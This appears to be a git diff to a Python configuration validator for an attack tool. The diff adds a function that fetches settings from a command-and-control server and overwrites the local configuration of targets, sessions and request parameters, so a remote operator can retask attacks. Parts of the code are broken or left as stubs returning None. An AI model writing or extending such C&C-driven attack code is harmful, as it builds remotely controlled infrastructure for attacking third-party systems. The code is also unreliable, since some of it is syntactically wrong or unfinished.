@@ -12,7 +12,7 @@ import json
 import requests
 from time import time
 
-def validateConfigFile(config_file):
+def validateConfigFile(config_file, override):
     """
     This utility is the entry point for every configuration 
     validation. It requires a configuration file to be passed 
@@ -54,7 +54,9 @@ def validateConfigFile(config_file):
     # retrieving configuration file
     configuration = {}
     try:
-        configuration = json.load(open(config_file))
+        with open(config_file) as configJSON:
+            configuration = json.load(configJSON)
+            configJSON.close()
         # if configuration file does not exist... we return None.
     except (FileNotFoundError, IOError) as error:
         return None
@@ -63,20 +65,22 @@ def validateConfigFile(config_file):
     if configuration.keys() != rootSchema.keys():
         return None
     # set to default
-    if len(configuration['user-agent_b']) == 0:
-        configuration['user-agent_b'] = rootSchema['user-agent_b'] 
-    if len(configuration['log_file']) == 0:
-        configuration['log_file'] = rootSchema['log_file']
-    if len(configuration['targets'] == 0):
-        configuration['targets'] = rootSchema['targets']
+    for setting in ['user_agent_b', 'log_file', 'targets']:
+        if len(configuration[setting]) == 0:
+            configuration[setting] = rootSchema[setting]
 
-    # 1. check for updates connecting to C&C
-    if len(configuration['cc_server'] != 0):
-         configuration = validateCCUpdate(configuration['cc_server'], rootSchema)
+    # 1. check for updates connecting to C&C (if not override option is enabled)
+    if (not override) and (len(configuration['cc_server']) != 0):
+         cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, configuration['last_modified'])
+         # check for remote connection success and update local configuration
+         if updated:
+             configuration = cc_config
+             if not updateConfigFile(config_file, configuration):
+                 return None
     
     # 2. compare target schema
     targetList = configuration['targets']
-    if len(targetList) = 0:
+    if len(targetList) == 0:
         return configuration
     else:
         for i in range(0, len(targetList)):
@@ -85,14 +89,11 @@ def validateConfigFile(config_file):
             if not set(target.keys()).issubset(set(targetSchema.keys()))
                 return None
             # check for custom values to be polished or set to default
-            if (target['period'] < 0) or ('period' not in target):
-                target['period'] = targetSchema['period']
-            if (target['max_count'] <= 0) or ('max_count' not in target):
-                target['max_count'] = targetSchema['max_count']
-            if (target['sessions'] <= 0) or ('sessions' not in target):
-                target['sessions'] = targetSchema['sessions']
+            for setting in ['period', 'max_count', 'sessions']:
+                if (target[setting] <= 0) or (setting not in target):
+                    target[setting] = targetSchema[setting]
             # check for action conditions
-            target = validateActionConditions(target, targetSchema)
+            target['action_conditions'] = validateActionConditions(target, targetSchema['action_conditions'])
 
             # 2.1. compare request schema
             if 'request_params' not in target:
@@ -105,3 +106,85 @@ def validateConfigFile(config_file):
             target['request_params'] = req
 
     return configuration
+
+
+
+def validateCCUpdate(server, schema, last_modified):
+    """
+    This utility is designed to provide a minimal interface to update current 
+    configuration with the remote command-and-control server.
+    Please note that we assume no errors from the C&C config processing...
+
+    @param server, string - C&C remote address
+    @param schema, dictionary - default schema in case of disable
+    @param last_modified, integer - timestamp representing the last modified attribute
+    @return (configuration, updated), (dictionary, boolean) 
+    """
+    configuration = {}
+    # try to perform update of the configuration from the C&C
+    try:
+        cc_config = requests.get(server + '/settings').json()
+        # check for updated instructions
+        # C&C update has priority only if it is more recent
+        if cc_config['timestamp'] >= last_modified:
+            if not cc_config['enable']: 
+                # configuration reset
+                configuration = schema
+                return configuration, True
+            else:
+                # configuration update
+                configuration = cc_config['settings']
+                return configuration, True
+        else:
+            return configuration, False
+
+    except Exception as e:
+        # if an error occurred, we return a non updated status
+        return configuration, False
+
+
+
+def updateConfigFile(config_file, configuration):
+    """
+    A simple utility to overwrite the configuration file
+
+    @param config_file, string - path to the configuration .txt or .json
+    @param configuration, dictionary - updated configuration
+    @return True in case of success, False otherwise
+    """
+    try:
+        with open(config_file, 'w') as configFile:
+            configFile.write(json.dumps(configuration))
+            configFile.close()
+            return True
+    except (FileNotFoundError, IOError) as error:
+        return False
+
+
+def validateActionConditions(target, schema):
+    """
+    This utility is used to validate the action conditions or to 
+    bring them to default values (attack will be always carried)
+
+    @param target, dictionary - target dictionary
+    @param schema, dictionary - default action conditions
+    @return action_conditions, dictionary
+    """
+    # first of all we check if action conditions are set
+    if 'action_conditions' not in target:
+        return schema
+    # check for AM / PM
+    # to be continued ...
+        
+    return None
+
+def validateRequestParams(request, schema):
+    """
+    This utility is the entry point for every configuration 
+    validation. It requires a configuration file to be passed 
+    to be validated via C&C and using a particular schema 
+
+    @param config_file, string - path to the configuration .txt or .json
+    @return configuration, dictionary or None if error occurs
+    """
+    return None
